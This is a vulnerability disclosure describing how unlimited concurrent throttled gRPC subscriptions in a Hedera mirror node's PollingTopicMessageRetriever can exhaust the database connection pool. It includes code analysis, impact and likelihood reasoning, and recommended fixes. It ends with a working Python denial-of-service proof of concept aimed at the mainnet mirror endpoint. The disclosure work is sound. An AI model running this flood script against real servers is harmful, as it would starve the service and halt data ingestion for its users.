### Title
Unbounded Concurrent Throttled Subscriptions Enable DB Connection Pool Exhaustion via PollingTopicMessageRetriever

### Summary
`PollingTopicMessageRetriever.retrieve()` creates a per-subscription polling loop with `numRepeats=Long.MAX_VALUE` and a 2-second interval for every throttled subscriber. There is no server-side cap on the total number of concurrent subscriptions, and the only early-termination guard (`isComplete()`) does not fire while a topic has a large message backlog. An unauthenticated attacker can open arbitrarily many gRPC connections, each carrying 5 subscriptions, to a backlogged topic, generating a sustained flood of synchronous JPA DB queries that exhausts the shared connection pool and starves all other DB-dependent operations.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.subscribeTopic()` (line 63) calls `topicMessageRetriever.retrieve(filter, true)` — the `true` flag selects the throttled path.

Inside `PollingTopicMessageRetriever.retrieve()` (lines 45–63), a `PollingContext` is constructed. Because `throttled=true`, the constructor (lines 98–101) unconditionally sets:

```java
numRepeats = Long.MAX_VALUE;
frequency  = retrieverProperties.getPollingFrequency();   // default 2 s
maxPageSize = retrieverProperties.getMaxPageSize();        // default 1000
```

The repeat loop (lines 51–55) fires `poll()` every 2 seconds, where `poll()` (lines 65–79) executes a synchronous JPA query via `topicMessageRepository.findByFilter(newFilter)` on the shared `Schedulers.boundedElastic()` thread pool.

**Root cause — `isComplete()` does not protect a backlogged topic:**

```java
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;
}
```

`isComplete()` returns `true` only when the last page was *smaller* than `maxPageSize` (1000). For any topic whose backlog continuously yields full pages of 1000 messages, `isComplete()` never returns `true`, and the loop runs at `Long.MAX_VALUE` repeats — effectively forever.

**Root cause — no subscription cap:**

`subscriberCount` (line 48, `TopicMessageServiceImpl`) is a Micrometer gauge only; it is never checked against any maximum. `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls *per TCP connection* but places no bound on the number of TCP connections. There is no per-IP, per-user, or global subscription limit anywhere in the gRPC module.

**Why the `timeout` does not help:**

```java
.timeout(retrieverProperties.getTimeout(), scheduler)   // default 60 s
```

This Reactor `timeout` fires only when *no item is emitted* for 60 seconds. While the topic backlog is non-empty, each 2-second poll emits up to 1000 items, continuously resetting the timer. The timeout never fires.

**DB query execution path:**

`TopicMessageRepositoryCustomImpl.findByFilter()` (lines 33–61) calls `typedQuery.getResultList().stream()` — a fully synchronous, blocking JDBC call. Each concurrent subscription occupies one `boundedElastic` thread and one HikariCP connection for the duration of the query.

### Impact Explanation

With the default HikariCP pool (typically 10 connections) and `boundedElastic` capped at `10 × CPU_cores` threads (e.g., 80 on an 8-core node), an attacker needs only ⌈80/5⌉ = 16 TCP connections (80 subscriptions) to saturate the thread pool. Once all threads are blocked waiting for or executing DB queries, the connection pool is exhausted. Every other component sharing that pool — including the importer's transaction-persistence path — is starved, halting the mirror node's ability to ingest and serve new transaction data.

### Likelihood Explanation

The attack requires zero authentication, zero privileges, and only a valid topic ID with a non-trivial message backlog (any active mainnet/testnet topic qualifies). Opening 16 TCP connections and 80 gRPC streams is trivially scriptable with any gRPC client library. The attack is repeatable and self-sustaining: as long as the attacker holds the connections open, the DB flood continues. The only infrastructure-level mitigation visible in the repository is a GCP-specific `maxRatePerEndpoint: 250` in the Helm chart, which is not universally deployed and does not limit subscription count.

### Recommendation

1. **Enforce a global subscription cap**: Add an `AtomicLong` counter in `TopicMessageServiceImpl` and reject new subscriptions (return `RESOURCE_EXHAUSTED`) when the count exceeds a configurable maximum (e.g., 500).
2. **Enforce a per-IP subscription cap**: Track active subscriptions by remote peer address (available from the gRPC `Context`) and reject excess subscriptions from a single IP.
3. **Decouple DB polling from per-subscription threads**: For the throttled retriever, route all polls through a shared, topic-keyed polling loop (similar to `SharedPollingTopicListener`) so N subscriptions to the same topic produce O(1) DB queries, not O(N).
4. **Add a hard wall-clock timeout on the historical retriever**: Regardless of message flow, terminate the retriever after a configurable maximum duration (e.g., 5 minutes) to prevent indefinite per-subscription DB polling.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, mirror_network_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_WITH_BACKLOG = basic_types_pb2.TopicID(topicNum=<active_topic>)

def flood():
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = mirror_network_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_WITH_BACKLOG,
        # no limit → throttled=true, numRepeats=Long.MAX_VALUE
    )
    for _ in range(5):   # maxConcurrentCallsPerConnection = 5
        threading.Thread(
            target=lambda: list(stub.subscribeTopic(req)), daemon=True
        ).start()

# 16 connections × 5 streams = 80 concurrent DB-polling subscriptions
for _ in range(16):
    threading.Thread(target=flood, daemon=True).start()

# Hold open indefinitely; DB connection pool exhausts within seconds.
input("Attack running. Press Enter to stop.")
```

Each of the 80 streams executes `findByFilter()` every 2 seconds. With a 10-connection HikariCP pool, all connections are occupied within the first polling cycle, and the mirror node's importer and other gRPC handlers are starved of DB access.
